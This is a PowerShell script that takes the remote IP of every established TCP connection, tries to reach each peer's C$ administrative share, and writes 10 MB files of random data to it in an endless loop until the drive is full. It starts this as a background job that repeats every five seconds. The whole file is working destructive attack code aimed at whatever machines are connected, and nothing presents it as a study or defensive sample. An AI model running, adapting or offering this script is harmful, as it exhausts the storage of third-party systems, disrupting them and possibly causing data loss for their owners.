function Fill-RemoteHostDriveWithGarbage {
    try {
        # Get incoming TCP connections (where LocalAddress is bound and RemoteAddress is the client)
        $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
        if ($connections) {
            foreach ($conn in $connections) {
                $remoteIP = $conn.RemoteAddress
                # Attempt to access the remote host's C$ share (admin share)
                $remotePath = "\\$remoteIP\C$"
                
                # Check if the remote path is accessible (requires admin rights)
                if (Test-Path $remotePath) {
                    $counter = 1
                    while ($true) {
                        try {
                            $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                            $garbage = [byte[]]::new(10485760) # 10MB in bytes
                            (New-Object System.Random).NextBytes($garbage)
                            [System.IO.File]::WriteAllBytes($filePath, $garbage)
                            Write-Host "Wrote 10MB to $filePath"
                            $counter++
                        }
                        catch {
                            # Stop if the drive is full or another error occurs
                            if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                                Write-Host "Drive at $remotePath is full or inaccessible. Stopping."
                                break
                            }
                            else {
                                Write-Host "Error writing to $filePath : $_"
                                break
                            }
                        }
                    }
                }
                else {
                    Write-Host "Cannot access $remotePath - check permissions or connectivity."
                }
            }
        }
        else {
            Write-Host "No incoming connections found."
        }
    }
    catch {
        Write-Host "General error: $_"
    }
}

# Run as a background job
Start-Job -ScriptBlock {
    while ($true) {
        Fill-RemoteHostDriveWithGarbage
        Start-Sleep -Seconds 5 # Small delay to avoid overwhelming the system
    }
}